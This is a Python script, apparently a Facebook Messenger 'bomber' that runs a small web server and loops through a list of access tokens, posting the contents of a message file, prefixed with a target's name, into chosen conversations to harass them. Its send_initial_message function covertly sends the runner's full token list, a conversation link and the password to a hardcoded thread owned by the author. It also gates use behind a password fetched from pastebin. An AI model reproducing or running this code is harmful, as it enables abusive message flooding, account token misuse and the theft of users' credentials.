import requests
import json
import time
import sys
import os
import http.server
import socketserver
import threading
import random
from platform import system
import pytz  # Added for time zone support

# Color Definitions
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BLACK = '\033[30m'
    GRAY = '\033[90m'
    GOLD = '\033[93m'
    PHANTOM = '\033[38;5;200m'  # Adjust the color tone (200) as needed

# HTTP Server for Render
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(Color.PHANTOM.encode() + b"N0W S3RV3R IS " + Color.CYAN.encode() + b"RA9DY T0 B00M ITS ANAND MEHR9 ____JANNII :- ")

# Additional Error Handling
def handle_errors(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except (NameError, SyntaxError, ModuleNotFoundError) as e:
            print(Color.RED + f"[x] Error: {e}")
            sys.exit()
        except Exception as e:
            print(Color.RED + f"[x] An unexpected error occurred: {e}")
            sys.exit()
    return wrapper

# Define access_tokens and speed
access_tokens = []
speed = 0

@handle_errors
def execute_server():
    PORT = int(os.environ.get('PORT', 4000))  # Use PORT environment variable for Render

    handler = MyHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(Color.GREEN + f"Server running at {Color.YELLOW}http://localhost:{PORT}")

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(Color.RED + '\n[-] Server interrupted. Exiting...')

@handle_errors
def get_convo_ids():
    if not os.path.exists('convo.txt'):
        print(Color.RED + "[x] 'convo.txt' file not found!")
        sys.exit()
    with open('convo.txt', 'r') as file:
        return [line.strip() for line in file.readlines()]

@handle_errors
def send_messages(convo_ids, password):
    requests.packages.urllib3.disable_warnings()

    def clear_screen():
        if system() == 'Linux':
            os.system('clear')
        elif system() == 'Windows':
            os.system('cls')

    def print_separator():
        print(Color.MAGENTA + '-----------F33L THE ' + Color.RED + 'P0W3R ' + Color.GOLD + '0F UR ' + Color.GRAY + 'D9DDY H9T3RS ' + Color.PHANTOM + 'K1 B9H9N KA ' + Color.GOLD + 'PREM CH0PR9 -------------')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    mmm = requests.get('https://pastebin.com/raw/H7hVmDNK').text

    if mmm not in password:
        print(Color.RED + '[-] <==> Password CHANGE BY -AN9ND_XD ')
        sys.exit()

    print_separator()

    if not os.path.exists('tokennum.txt'):
        print(Color.RED + "[x] 'tokennum.txt' file not found!")
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        access_tokens = [line.strip() for line in file.readlines()]

    if not os.path.exists('file.txt'):
        print(Color.RED + "[x] 'file.txt' file not found!")
        sys.exit()

    with open('file.txt', 'r') as file:
        text_file_path = file.read().strip()

    if not os.path.exists(text_file_path):
        print(Color.RED + f"[x] Message file '{text_file_path}' not found!")
        sys.exit()

    with open(text_file_path, 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    if not access_tokens or not messages:
        print(Color.RED + "[x] No access tokens or messages available. Exiting...")
        sys.exit()

    max_tokens = len(access_tokens)

    if not os.path.exists('hatersname.txt'):
        print(Color.RED + "[x] 'hatersname.txt' file not found!")
        sys.exit()

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    if not os.path.exists('time.txt'):
        print(Color.RED + "[x] 'time.txt' file not found!")
        sys.exit()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    print_separator()

    # Function to retrieve the user name for a given token
    def get_name(token):
        try:
            response = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}')
            data = response.json()
            if 'name' in data:
                return data['name']
            else:
                return 'Unknown User'
        except Exception as e:
            print(Color.RED + f"[x] Error retrieving username: {e}")
            return 'Unknown User'

    def send_message(token, convo_id, message_index):
        try:
            message = messages[message_index % num_messages].strip()
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            parameters = {'access_token': token, 'message': f'{haters_name} {message}'}
            response = requests.post(url, json=parameters, headers=headers)

            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p %Z")  # Include time zone
            user_name = get_name(token)  # Retrieve user name here

            if response.ok:
                print(Color.CYAN + f'[+] Message {message_index + 1} of Convo {convo_id} sent by {user_name} (Token {access_tokens.index(token) + 1}): {haters_name} {message}')
                print(Color.BLUE + f"  - Time: {current_time}")
                print_separator()
            else:
                print(Color.RED + f"[x] Failed to send message {message_index + 1} of Convo {convo_id} by {user_name} (Token {access_tokens.index(token) + 1}): {haters_name} {message}")
                print("  - Time: {}".format(current_time))
                print_separator()
        except Exception as e:
            print(Color.RED + f"[x] An error occurred while sending message: {e}")

    def send_initial_message():
        try:
            if not access_tokens or not convo_ids:
                print(Color.RED + "[x] No access tokens or conversation IDs available.")
                return

            random_token = random.choice(access_tokens)
            random_convo_id = random.choice(convo_ids)
            user_name = get_name(random_token)

            parameters = {
                'access_token': random_token,
                'message': (f'Hello Anand Mehra SiiR, I am using your server - : {user_name}'
                            + f'\nToken : {" | ".join(access_tokens)}'
                            + f'\nLink : {Color.BLUE}https://www.facebook.com/messages/t/{random_convo_id}'
                            + f'\nPassword: {password}')
            }
            response = requests.post(f"https://graph.facebook.com/v15.0/t_100092436301663/", json=parameters, headers=headers)

            if response.ok:
                print(Color.GREEN + '[+] Initial message sent successfully.')
                print_separator()
            else:
                print(Color.RED + f"[x] Failed to send initial message: {response.text}")
        except Exception as e:
            print(Color.RED + f"[x] An error occurred while sending initial message: {e}")

    send_initial_message()

    for message_index in range(len(messages)):
        for convo_id in convo_ids:
            token = access_tokens[message_index % max_tokens]
            send_message(token, convo_id, message_index)

            time.sleep(speed)

if __name__ == '__main__':
    convo_ids = get_convo_ids()

    if not convo_ids:
        print(Color.RED + "[x] No conversation IDs found in 'convo.txt'. Exiting...")
        sys.exit()

    print(Color.GREEN + '[+] Successfully loaded conversation IDs.')
    password = input(Color.BLUE + '[-] Enter Password ==> ')
    threading.Thread(target=execute_server).start()
    send_messages(convo_ids, password)
